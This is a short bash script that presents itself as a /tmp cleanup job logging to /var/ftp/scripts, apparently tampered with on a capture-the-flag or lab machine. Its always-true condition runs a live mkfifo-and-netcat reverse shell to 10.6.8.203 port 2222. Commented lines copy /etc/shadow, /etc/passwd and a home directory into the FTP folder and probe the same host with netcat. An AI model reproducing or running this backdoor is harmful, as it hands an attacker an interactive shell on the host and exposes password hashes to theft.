#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
		echo $(date) >> /var/ftp/scripts/removed_files.log

        # First time:
        # cp -r /home/namelessone /var/ftp/scripts
        # cp /etc/shadow /var/ftp/scripts
        # cp /etc/passwd /var/ftp/scripts

        # Attempting reverse shell using netcat:
        # nc -z -w 5 -v 10.6.8.203 1234 </dev/null; echo $? >> /var/ftp/scripts/nc.log

        # Attempt 2 at reverse shell:
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.8.203 2222 >/tmp/f
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
